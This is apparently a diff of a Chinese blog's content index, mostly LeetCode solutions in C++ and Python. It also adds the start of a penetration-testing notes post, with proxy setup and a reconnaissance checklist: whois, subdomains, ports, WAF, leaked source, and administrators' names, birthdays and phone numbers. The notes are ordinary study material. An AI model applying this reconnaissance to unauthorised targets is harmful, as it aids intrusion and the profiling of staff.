+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">char</span>&gt; set;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">length</span>(),r=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> l = <span class="number">0</span>;l&lt;n;l++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l!=<span class="number">0</span>)&#123;</span><br><span class="line">                set.<span class="built_in">erase</span>(s[l<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(r&lt;n &amp;&amp; set.<span class="built_in">count</span>(s[r])==<span class="number">0</span>)&#123;</span><br><span class="line">                set.<span class="built_in">insert</span>(s[r]);</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans,r-l);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        occ = <span class="built_in">set</span>()</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        r,ans=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> l != <span class="number">0</span>:</span><br><span class="line">                occ.remove(s[l-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">while</span> r&lt;n <span class="keyword">and</span> s[r] <span class="keyword">not</span> <span class="keyword">in</span> occ:</span><br><span class="line">                occ.add(s[r])</span><br><span class="line">                r+=<span class="number">1</span></span><br><span class="line">            ans = <span class="built_in">max</span> (ans,r-l)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
+<h1>动态规划</h1>
+<h2 id="5-最长回文子串">5.最长回文子串</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string result = <span class="string">&quot;&quot;</span>,odd,even;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            odd = <span class="built_in">expand</span>(s,i,i);</span><br><span class="line">            even = <span class="built_in">expand</span>(s,i,i<span class="number">+1</span>);</span><br><span class="line">            <span class="keyword">if</span>(odd.<span class="built_in">length</span>()&gt;result.<span class="built_in">length</span>()) result = odd;</span><br><span class="line">            <span class="keyword">if</span>(even.<span class="built_in">length</span>()&gt;result.<span class="built_in">length</span>()) result = even;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">expand</span><span class="params">(string s,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;s.<span class="built_in">length</span>() &amp;&amp; s[l]==s[r])&#123;</span><br><span class="line">            l--,r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.<span class="built_in">substr</span>(l<span class="number">+1</span>,r-l<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        </span><br><span class="line">        dp = [[<span class="literal">False</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]  <span class="comment"># 初始化 dp 数组</span></span><br><span class="line">        start, end = <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 记录最长回文子串的起始和结束位置</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 单个字符一定是回文</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            dp[i][i] = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查长度为 2 的子串</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i] == s[i + <span class="number">1</span>]:</span><br><span class="line">                dp[i][i + <span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">                start, end = i, i + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查长度大于 2 的子串</span></span><br><span class="line">        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n + <span class="number">1</span>):  <span class="comment"># 子串长度从 3 到 n</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - length + <span class="number">1</span>):  <span class="comment"># 子串起始位置</span></span><br><span class="line">                j = i + length - <span class="number">1</span>  <span class="comment"># 子串结束位置</span></span><br><span class="line">                <span class="keyword">if</span> s[i] == s[j] <span class="keyword">and</span> dp[i + <span class="number">1</span>][j - <span class="number">1</span>]:  <span class="comment"># 状态转移</span></span><br><span class="line">                    dp[i][j] = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> length &gt; (end - start + <span class="number">1</span>):  <span class="comment"># 更新最长回文子串</span></span><br><span class="line">                        start, end = i, j</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> s[start:end + <span class="number">1</span>]  <span class="comment"># 返回最长回文子串</span></span><br><span class="line">//优化</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">max_hw</span>(<span class="params">l:<span class="built_in">int</span>, r:<span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span> :</span><br><span class="line">            <span class="keyword">while</span> l&gt;=<span class="number">0</span> <span class="keyword">and</span> r&lt;<span class="built_in">len</span>(s) <span class="keyword">and</span> s[l] == s[r]:</span><br><span class="line">                l -= <span class="number">1</span></span><br><span class="line">                r += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> s[l+<span class="number">1</span>:r]</span><br><span class="line"></span><br><span class="line">        result = s[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            odd = max_hw(i,i)</span><br><span class="line">            even = max_hw(i,i+<span class="number">1</span>)</span><br><span class="line">            result = <span class="built_in">max</span>(result,odd,even,key=<span class="built_in">len</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<h2 id="509-斐波那契数">509.斐波那契数</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fib</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> f1=<span class="number">0</span>,f2 =<span class="number">1</span>,temp;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            temp = f1+f2;</span><br><span class="line">            f1 = f2;</span><br><span class="line">            f2 = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        f1 ,f2 ,fn = <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n ==<span class="number">0</span> :<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">            fn = f1 + f2</span><br><span class="line">            f1, f2 = f2, fn</span><br><span class="line">        <span class="keyword">return</span> fn </span><br></pre></td></tr></table></figure>
+<h2 id="300-最长增长子序列">300.最长增长子序列</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i],dp[j]<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp.<span class="built_in">begin</span>(),dp.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(dp.<span class="built_in">begin</span>(),dp.<span class="built_in">end</span>(),num);</span><br><span class="line">            <span class="keyword">if</span>(it == dp.<span class="built_in">end</span>())&#123;</span><br><span class="line">                dp.<span class="built_in">push_back</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                *it = num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        dp = [<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                <span class="keyword">if</span> nums[j]&lt;nums[i]:</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp)</span><br><span class="line"><span class="comment"># 优化：二分查找</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        dp = []  <span class="comment"># 用于存储递增子序列</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment"># 使用二分查找找到插入位置</span></span><br><span class="line">            pos = bisect.bisect_left(dp, num)</span><br><span class="line">            <span class="keyword">if</span> pos == <span class="built_in">len</span>(dp):</span><br><span class="line">                dp.append(num)  <span class="comment"># 如果 num 大于所有元素，直接添加到末尾</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[pos] = num  <span class="comment"># 否则替换掉第一个大于等于 num 的元素</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(dp)  <span class="comment"># dp 的长度即为最长递增子序列的长度</span></span><br></pre></td></tr></table></figure>
+<h2 id="72-编辑距离">72.编辑距离</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n1 = word<span class="number">1.l</span>ength(), n2 = word<span class="number">2.l</span>ength();</span><br><span class="line">        <span class="keyword">if</span>(n1*n2==<span class="number">0</span>) <span class="keyword">return</span> n1+n2;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n1<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n2<span class="number">+1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n1<span class="number">+1</span>;i++) dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n2<span class="number">+1</span>;j++) dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n1<span class="number">+1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n2<span class="number">+1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="number">1</span>+<span class="built_in">min</span>(&#123;dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n1][n2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDistance</span>(<span class="params">self, word1: <span class="built_in">str</span>, word2: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n1, n2 = <span class="built_in">len</span>(word1), <span class="built_in">len</span>(word2)</span><br><span class="line">        <span class="keyword">if</span> n1*n2 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> n1+n2</span><br><span class="line">        dp = [[<span class="number">0</span>]*(n2+<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n1+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1+<span class="number">1</span>):</span><br><span class="line">            dp[i][<span class="number">0</span>]=i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2+<span class="number">1</span>):</span><br><span class="line">            dp[<span class="number">0</span>][j]=j</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n1+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n2+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> word1[i-<span class="number">1</span>] == word2[j-<span class="number">1</span>]:</span><br><span class="line">                    dp[i][j] = dp [i-<span class="number">1</span>][j-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j-<span class="number">1</span>])+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> dp[n1][n2]</span><br></pre></td></tr></table></figure>
+<h2 id="198-打家劫舍">198.打家劫舍</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(),dp0=<span class="number">0</span>,dp1=nums[<span class="number">0</span>],temp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            temp = <span class="built_in">max</span>(dp0,dp1);</span><br><span class="line">            dp1 = dp0 + nums[i];</span><br><span class="line">            dp0 = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp0,dp1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rob</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n ==<span class="number">0</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        dp = [[<span class="number">0</span>]*<span class="number">2</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>][<span class="number">0</span>],dp[i-<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">            dp[i][<span class="number">1</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>]+nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[n-<span class="number">1</span>][<span class="number">0</span>],dp[n-<span class="number">1</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+<h1>贪心算法</h1>
+]]></content>
+  </entry>
+  <entry>
     <title>力扣hot100python题解</title>
     <url>/2025/03/04/%E5%8A%9B%E6%89%A3hot100python%E9%A2%98%E8%A7%A3/</url>
     <content><![CDATA[<h1>哈希</h1>
@@ -261,237 +538,511 @@
       </tags>
   </entry>
   <entry>
-    <title>Python 基础</title>
-    <url>/2025/02/04/Python-%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1>关键字</h1>
-<h2 id="yield">yield</h2>
-<p><code>yield</code> 是 Python 中的一个关键字，用于定义生成器函数（generator function）。生成器函数是一种特殊的函数，它可以逐步产生值，而不是一次性返回所有结果。<code>yield</code> 的作用是将函数变成一个生成器，每次调用生成器的 <code>__next__()</code> 方法时，函数会执行到 <code>yield</code> 语句并返回一个值，然后暂停执行，直到下一次调用。</p>
-<hr>
-<h3 id="yield-的基本用法"><strong>yield 的基本用法</strong></h3>
-<h4 id="示例-1：简单的生成器函数">示例 1：简单的生成器函数</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = simple_generator()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 3</span></span><br></pre></td></tr></table></figure>
+    <title>渗透测试</title>
+    <url>/2025/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络适配器-&gt;WLAN点下拉geng&#x27;d-&gt;共享</span><br><span class="line">clash verge: 打开系统代理和Tun 端口号7897</span><br><span class="line">ip: VMnet8的IPv4地址</span><br><span class="line">git 全局代理：</span><br><span class="line">	添加：git config --global http.proxy http://IP:7897</span><br><span class="line">		 git config --global https.proxy http://IP:7897</span><br><span class="line">	取消：git config --global --unset http.proxy</span><br><span class="line">		 git config --global --unset https.proxy</span><br><span class="line">	查看：git config --global -l</span><br></pre></td></tr></table></figure>
+<h1>信息收集</h1>
+<h2 id="需收集的信息：">需收集的信息：</h2>
 <ul>
-<li>每次调用 <code>next(gen)</code>，函数会从上次暂停的地方继续执行，直到遇到下一个 <code>yield</code>。</li>
-<li>当没有更多的值可以生成时，会抛出 <code>StopIteration</code> 异常。</li>
+<li>域名信息(whois.、备案信息、子域名)</li>
+<li>服务器信息（端口、服务、真实IP)</li>
+<li>网站信息（网站架构、操作系统、中间件、数据库、编程语言、指纹信息、W八F、敏感目录、敏感文件、源码泄露、旁站、C段)</li>
+<li>管理员信息（姓名、职务、生日、联系电话、邮件地址）</li>
 </ul>
-<hr>
-<h4 id="示例-2：使用-for-循环遍历生成器">示例 2：使用 for 循环遍历生成器</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 for 循环遍历生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> simple_generator():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
+<h2 id="域名信息">域名信息</h2>
+<h3 id="whois">whois</h3>
+<h4 id="域名查询whois">域名查询whois</h4>
+<p>根据已知域名反查,获取:注册人邮箱;注册人姓名;注册人手机;注册更新时间等信息</p>
 <ul>
-<li><code>for</code> 循环会自动处理 <code>StopIteration</code> 异常，因此不需要手动调用 <code>next()</code>。</li>
-</ul>
-<hr>
-<h3 id="yield-的优势"><strong>yield 的优势</strong></h3>
-<ol>
 <li>
-<p><strong>惰性求值</strong>：</p>
-<ul>
-<li>生成器不会一次性生成所有值，而是按需生成，节省内存。</li>
-<li>适合处理大量数据或无限序列。</li>
-</ul>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd yjtools</span><br><span class="line">python whois_check.py</span><br></pre></td></tr></table></figure>
 </li>
 <li>
-<p><strong>代码简洁</strong>：</p>
-<ul>
-<li>使用 <code>yield</code> 可以避免手动实现迭代器协议（<code>__iter__</code> 和 <code>__next__</code>）。</li>
-</ul>
+<p>命令行</p>
 </li>
-<li>
-<p><strong>状态保持</strong>：</p>
-<ul>
-<li>生成器函数会记住上次执行的状态，下次调用时从上次暂停的地方继续。</li>
 </ul>
-</li>
-</ol>
-<hr>
-<h3 id="yield-的高级用法"><strong>yield 的高级用法</strong></h3>
-<h4 id="示例-3：生成无限序列">示例 3：生成无限序列</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">infinite_sequence</span>():</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = infinite_sequence()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="comment"># 可以无限调用 next(gen)</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois [域名]</span><br></pre></td></tr></table></figure>
 <ul>
-<li>这个生成器会无限生成递增的整数。</li>
+<li>接口</li>
 </ul>
-<hr>
-<h4 id="示例-4：使用-yield-实现斐波那契数列">示例 4：使用 <code>yield</code> 实现斐波那契数列</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>():</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = fibonacci()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br></pre></td></tr></table></figure>
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">8</span><br><span class="line">13</span><br><span class="line">21</span><br><span class="line">34</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>
+<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a><br>
+<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
+</blockquote>
+<h4 id="whois反查域名">whois反查域名</h4>
+<p>根据已知域名WHOIS中的信息来反查其它与此信息相同的域名列表,但可能是代理商</p>
 <ul>
-<li>这个生成器会无限生成斐波那契数列的值。</li>
+<li>接口</li>
 </ul>
-<hr>
